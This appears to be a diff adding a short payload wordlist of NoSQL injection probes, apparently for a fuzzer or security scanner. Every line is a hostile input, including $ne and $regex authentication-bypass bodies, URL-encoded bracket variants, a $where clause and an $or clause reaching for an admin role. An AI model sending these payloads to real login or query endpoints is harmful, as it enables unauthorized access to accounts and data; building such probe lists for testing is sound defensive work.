@@ -1,0 +1,15 @@
+# NoSQL encoding and structured body probes
+{"$ne":null}
+{"$gt":""}
+{"$regex":".*"}
+{"$exists":true}
+{"username":{"$ne":null},"password":{"$ne":null}}
+username[$ne]=null&password[$ne]=null
+username%5B%24ne%5D=null&password%5B%24ne%5D=null
+{"$where":"return true"}
+{"$or":[{}, {"role":"admin"}]}
+{"id":{"$in":["1","2","admin"]}}
+{"profile.email":{"$regex":".*@.*"}}
+{"$expr":{"$eq":[1,1]}}
+{"$jsonSchema":{}}
+{"$comment":"NOSQL_CANARY"}
